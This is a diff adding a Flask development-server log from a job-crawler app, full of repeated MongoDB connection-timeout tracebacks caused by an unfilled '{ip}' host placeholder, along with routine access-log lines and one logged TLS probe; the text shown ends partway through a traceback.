@@ -1,0 +1,1364 @@
+[31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:5000
+ * Running on http://172.31.14.133:5000
+[33mPress CTRL+C to quit[0m
+[2025-02-05 12:18:49,131] ERROR in app: Exception on /api/crawl [GET]
+Traceback (most recent call last):
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/flask/app.py", line 1511, in wsgi_app
+    response = self.full_dispatch_request()
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/flask/app.py", line 919, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/flask/app.py", line 917, in full_dispatch_request
+    rv = self.dispatch_request()
+         ^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/flask/app.py", line 902, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/intern_zip/app.py", line 116, in crawl_jobs
+    collection.delete_many({})
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/collection.py", line 1711, in delete_many
+    self._delete_retryable(
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/collection.py", line 1587, in _delete_retryable
+    return self._database.client._retryable_write(
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/mongo_client.py", line 1896, in _retryable_write
+    return self._retry_with_session(retryable, func, s, bulk, operation, operation_id)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/mongo_client.py", line 1782, in _retry_with_session
+    return self._retry_internal(
+           ^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/_csot.py", line 119, in csot_wrapper
+    return func(self, *args, **kwargs)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/mongo_client.py", line 1828, in _retry_internal
+    ).run()
+      ^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/mongo_client.py", line 2565, in run
+    return self._read() if self._is_read else self._write()
+                                              ^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/mongo_client.py", line 2673, in _write
+    self._server = self._get_server()
+                   ^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/mongo_client.py", line 2656, in _get_server
+    return self._client._select_server(
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/mongo_client.py", line 1647, in _select_server
+    server = topology.select_server(
+             ^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/topology.py", line 402, in select_server
+    server = self._select_server(
+             ^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/topology.py", line 380, in _select_server
+    servers = self.select_servers(
+              ^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/topology.py", line 287, in select_servers
+    server_descriptions = self._select_servers_loop(
+                          ^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/topology.py", line 337, in _select_servers_loop
+    raise ServerSelectionTimeoutError(
+pymongo.errors.ServerSelectionTimeoutError: {ip}:27017: [Errno -2] Name or service not known (configured timeouts: socketTimeoutMS: 20000.0ms, connectTimeoutMS: 20000.0ms), Timeout: 30s, Topology Description: <TopologyDescription id: 67a356c4af26359cc72d6a76, topology_type: Unknown, servers: [<ServerDescription ('{ip}', 27017) server_type: Unknown, rtt: None, error=AutoReconnect('{ip}:27017: [Errno -2] Name or service not known (configured timeouts: socketTimeoutMS: 20000.0ms, connectTimeoutMS: 20000.0ms)')>]>
+127.0.0.1 - - [05/Feb/2025 12:18:49] "[35m[1mGET /api/crawl HTTP/1.1[0m" 500 -
+[2025-02-05 12:20:11,177] ERROR in app: Exception on /api/crawl [GET]
+Traceback (most recent call last):
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/flask/app.py", line 1511, in wsgi_app
+    response = self.full_dispatch_request()
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/flask/app.py", line 919, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/flask/app.py", line 917, in full_dispatch_request
+    rv = self.dispatch_request()
+         ^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/flask/app.py", line 902, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/intern_zip/app.py", line 116, in crawl_jobs
+    collection.delete_many({})
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/collection.py", line 1711, in delete_many
+    self._delete_retryable(
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/collection.py", line 1587, in _delete_retryable
+    return self._database.client._retryable_write(
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/mongo_client.py", line 1896, in _retryable_write
+    return self._retry_with_session(retryable, func, s, bulk, operation, operation_id)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/mongo_client.py", line 1782, in _retry_with_session
+    return self._retry_internal(
+           ^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/_csot.py", line 119, in csot_wrapper
+    return func(self, *args, **kwargs)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/mongo_client.py", line 1828, in _retry_internal
+    ).run()
+      ^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/mongo_client.py", line 2565, in run
+    return self._read() if self._is_read else self._write()
+                                              ^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/mongo_client.py", line 2673, in _write
+    self._server = self._get_server()
+                   ^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/mongo_client.py", line 2656, in _get_server
+    return self._client._select_server(
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/mongo_client.py", line 1647, in _select_server
+    server = topology.select_server(
+             ^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/topology.py", line 402, in select_server
+    server = self._select_server(
+             ^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/topology.py", line 380, in _select_server
+    servers = self.select_servers(
+              ^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/topology.py", line 287, in select_servers
+    server_descriptions = self._select_servers_loop(
+                          ^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/topology.py", line 337, in _select_servers_loop
+    raise ServerSelectionTimeoutError(
+pymongo.errors.ServerSelectionTimeoutError: {ip}:27017: [Errno -2] Name or service not known (configured timeouts: socketTimeoutMS: 20000.0ms, connectTimeoutMS: 20000.0ms), Timeout: 30s, Topology Description: <TopologyDescription id: 67a356c4af26359cc72d6a76, topology_type: Unknown, servers: [<ServerDescription ('{ip}', 27017) server_type: Unknown, rtt: None, error=AutoReconnect('{ip}:27017: [Errno -2] Name or service not known (configured timeouts: socketTimeoutMS: 20000.0ms, connectTimeoutMS: 20000.0ms)')>]>
+127.0.0.1 - - [05/Feb/2025 12:20:11] "[35m[1mGET /api/crawl HTTP/1.1[0m" 500 -
+203.253.93.249 - - [05/Feb/2025 12:20:38] "GET / HTTP/1.1" 200 -
+203.253.93.249 - - [05/Feb/2025 12:20:38] "[36mGET /static/styles.css HTTP/1.1[0m" 304 -
+203.253.93.249 - - [05/Feb/2025 12:20:42] "[36mGET /static/styles.css HTTP/1.1[0m" 304 -
+[2025-02-05 12:21:09,718] ERROR in app: Exception on /api/jobs/count [GET]
+Traceback (most recent call last):
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/flask/app.py", line 1511, in wsgi_app
+    response = self.full_dispatch_request()
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/flask/app.py", line 919, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/flask/app.py", line 917, in full_dispatch_request
+    rv = self.dispatch_request()
+         ^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/flask/app.py", line 902, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/intern_zip/app.py", line 85, in get_job_counts
+    counts = list(collection.aggregate(pipeline))
+                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/collection.py", line 2978, in aggregate
+    return self._aggregate(
+           ^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/_csot.py", line 119, in csot_wrapper
+    return func(self, *args, **kwargs)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/collection.py", line 2886, in _aggregate
+    return self._database.client._retryable_read(
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/mongo_client.py", line 1861, in _retryable_read
+    return self._retry_internal(
+           ^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/_csot.py", line 119, in csot_wrapper
+    return func(self, *args, **kwargs)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/mongo_client.py", line 1828, in _retry_internal
+    ).run()
+      ^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/mongo_client.py", line 2565, in run
+    return self._read() if self._is_read else self._write()
+           ^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/mongo_client.py", line 2700, in _read
+    self._server = self._get_server()
+                   ^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/mongo_client.py", line 2656, in _get_server
+    return self._client._select_server(
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/mongo_client.py", line 1647, in _select_server
+    server = topology.select_server(
+             ^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/topology.py", line 402, in select_server
+    server = self._select_server(
+             ^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/topology.py", line 380, in _select_server
+    servers = self.select_servers(
+              ^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/topology.py", line 287, in select_servers
+    server_descriptions = self._select_servers_loop(
+                          ^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/topology.py", line 337, in _select_servers_loop
+    raise ServerSelectionTimeoutError(
+pymongo.errors.ServerSelectionTimeoutError: {ip}:27017: [Errno -2] Name or service not known (configured timeouts: socketTimeoutMS: 20000.0ms, connectTimeoutMS: 20000.0ms), Timeout: 30s, Topology Description: <TopologyDescription id: 67a356c4af26359cc72d6a76, topology_type: Unknown, servers: [<ServerDescription ('{ip}', 27017) server_type: Unknown, rtt: None, error=AutoReconnect('{ip}:27017: [Errno -2] Name or service not known (configured timeouts: socketTimeoutMS: 20000.0ms, connectTimeoutMS: 20000.0ms)')>]>
+203.253.93.249 - - [05/Feb/2025 12:21:09] "[35m[1mGET /api/jobs/count HTTP/1.1[0m" 500 -
+[2025-02-05 12:21:09,857] ERROR in app: Exception on /api/last-crawl [GET]
+Traceback (most recent call last):
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/flask/app.py", line 1511, in wsgi_app
+    response = self.full_dispatch_request()
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/flask/app.py", line 919, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/flask/app.py", line 917, in full_dispatch_request
+    rv = self.dispatch_request()
+         ^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/flask/app.py", line 902, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/intern_zip/app.py", line 95, in get_last_crawl_time
+    last_crawl = meta_collection.find_one({"type": "last_crawl"})
+                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/collection.py", line 1755, in find_one
+    for result in cursor.limit(-1):
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/cursor.py", line 1281, in __next__
+    return self.next()
+           ^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/cursor.py", line 1257, in next
+    if len(self._data) or self._refresh():
+                          ^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/cursor.py", line 1205, in _refresh
+    self._send_message(q)
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/cursor.py", line 1100, in _send_message
+    response = client._run_operation(
+               ^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/_csot.py", line 119, in csot_wrapper
+    return func(self, *args, **kwargs)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/mongo_client.py", line 1752, in _run_operation
+    return self._retryable_read(
+           ^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/mongo_client.py", line 1861, in _retryable_read
+    return self._retry_internal(
+           ^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/_csot.py", line 119, in csot_wrapper
+    return func(self, *args, **kwargs)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/mongo_client.py", line 1828, in _retry_internal
+    ).run()
+      ^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/mongo_client.py", line 2565, in run
+    return self._read() if self._is_read else self._write()
+           ^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/mongo_client.py", line 2700, in _read
+    self._server = self._get_server()
+                   ^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/mongo_client.py", line 2656, in _get_server
+    return self._client._select_server(
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/mongo_client.py", line 1647, in _select_server
+    server = topology.select_server(
+             ^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/topology.py", line 402, in select_server
+    server = self._select_server(
+             ^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/topology.py", line 380, in _select_server
+    servers = self.select_servers(
+              ^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/topology.py", line 287, in select_servers
+    server_descriptions = self._select_servers_loop(
+                          ^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/topology.py", line 337, in _select_servers_loop
+    raise ServerSelectionTimeoutError(
+pymongo.errors.ServerSelectionTimeoutError: {ip}:27017: [Errno -2] Name or service not known (configured timeouts: socketTimeoutMS: 20000.0ms, connectTimeoutMS: 20000.0ms), Timeout: 30s, Topology Description: <TopologyDescription id: 67a356c4af26359cc72d6a77, topology_type: Unknown, servers: [<ServerDescription ('{ip}', 27017) server_type: Unknown, rtt: None, error=AutoReconnect('{ip}:27017: [Errno -2] Name or service not known (configured timeouts: socketTimeoutMS: 20000.0ms, connectTimeoutMS: 20000.0ms)')>]>
+203.253.93.249 - - [05/Feb/2025 12:21:09] "[35m[1mGET /api/last-crawl HTTP/1.1[0m" 500 -
+65.49.1.54 - - [05/Feb/2025 12:44:31] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00{\x01\x00\x00w\x03\x03Ìì_<\x028ß*k<hÚ@\x94xVaÐÂ\x9bÎúâ¼\x8fi+\x81x\x16Öæ\x00\x00\x1aÀ/À+À\x11À\x07À\x13À')
+65.49.1.54 - - [05/Feb/2025 12:44:31] "[31m[1m\x16\x03\x01\x00{\x01\x00\x00w\x03\x03Ìì_<\x028ß*k<hÚ@\x94xVaÐÂ\x9bÎúâ¼\x8fi+\x81x\x16Öæ\x00\x00\x1aÀ/À+À\x11À\x07À\x13À\x09À\x14À[0m" 400 -
+139.162.84.112 - - [05/Feb/2025 12:48:37] "GET / HTTP/1.1" 200 -
+[2025-02-05 12:53:22,983] ERROR in app: Exception on /api/jobs/count [GET]
+Traceback (most recent call last):
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/flask/app.py", line 1511, in wsgi_app
+    response = self.full_dispatch_request()
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/flask/app.py", line 919, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/flask/app.py", line 917, in full_dispatch_request
+    rv = self.dispatch_request()
+         ^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/flask/app.py", line 902, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/intern_zip/app.py", line 85, in get_job_counts
+    counts = list(collection.aggregate(pipeline))
+                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/collection.py", line 2978, in aggregate
+    return self._aggregate(
+           ^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/_csot.py", line 119, in csot_wrapper
+    return func(self, *args, **kwargs)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/collection.py", line 2886, in _aggregate
+    return self._database.client._retryable_read(
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/mongo_client.py", line 1861, in _retryable_read
+    return self._retry_internal(
+           ^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/_csot.py", line 119, in csot_wrapper
+    return func(self, *args, **kwargs)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/mongo_client.py", line 1828, in _retry_internal
+    ).run()
+      ^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/mongo_client.py", line 2565, in run
+    return self._read() if self._is_read else self._write()
+           ^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/mongo_client.py", line 2700, in _read
+    self._server = self._get_server()
+                   ^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/mongo_client.py", line 2656, in _get_server
+    return self._client._select_server(
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/mongo_client.py", line 1647, in _select_server
+    server = topology.select_server(
+             ^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/topology.py", line 402, in select_server
+    server = self._select_server(
+             ^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/topology.py", line 380, in _select_server
+    servers = self.select_servers(
+              ^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/topology.py", line 287, in select_servers
+    server_descriptions = self._select_servers_loop(
+                          ^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/topology.py", line 337, in _select_servers_loop
+    raise ServerSelectionTimeoutError(
+pymongo.errors.ServerSelectionTimeoutError: {ip}:27017: [Errno -2] Name or service not known (configured timeouts: socketTimeoutMS: 20000.0ms, connectTimeoutMS: 20000.0ms), Timeout: 30s, Topology Description: <TopologyDescription id: 67a356c4af26359cc72d6a76, topology_type: Unknown, servers: [<ServerDescription ('{ip}', 27017) server_type: Unknown, rtt: None, error=AutoReconnect('{ip}:27017: [Errno -2] Name or service not known (configured timeouts: socketTimeoutMS: 20000.0ms, connectTimeoutMS: 20000.0ms)')>]>
+211.36.146.121 - - [05/Feb/2025 12:53:22] "[35m[1mGET /api/jobs/count HTTP/1.1[0m" 500 -
+[2025-02-05 12:53:23,113] ERROR in app: Exception on /api/last-crawl [GET]
+Traceback (most recent call last):
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/flask/app.py", line 1511, in wsgi_app
+    response = self.full_dispatch_request()
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/flask/app.py", line 919, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/flask/app.py", line 917, in full_dispatch_request
+    rv = self.dispatch_request()
+         ^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/flask/app.py", line 902, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/intern_zip/app.py", line 95, in get_last_crawl_time
+    last_crawl = meta_collection.find_one({"type": "last_crawl"})
+                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/collection.py", line 1755, in find_one
+    for result in cursor.limit(-1):
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/cursor.py", line 1281, in __next__
+    return self.next()
+           ^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/cursor.py", line 1257, in next
+    if len(self._data) or self._refresh():
+                          ^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/cursor.py", line 1205, in _refresh
+    self._send_message(q)
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/cursor.py", line 1100, in _send_message
+    response = client._run_operation(
+               ^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/_csot.py", line 119, in csot_wrapper
+    return func(self, *args, **kwargs)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/mongo_client.py", line 1752, in _run_operation
+    return self._retryable_read(
+           ^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/mongo_client.py", line 1861, in _retryable_read
+    return self._retry_internal(
+           ^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/_csot.py", line 119, in csot_wrapper
+    return func(self, *args, **kwargs)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/mongo_client.py", line 1828, in _retry_internal
+    ).run()
+      ^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/mongo_client.py", line 2565, in run
+    return self._read() if self._is_read else self._write()
+           ^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/mongo_client.py", line 2700, in _read
+    self._server = self._get_server()
+                   ^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/mongo_client.py", line 2656, in _get_server
+    return self._client._select_server(
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/mongo_client.py", line 1647, in _select_server
+    server = topology.select_server(
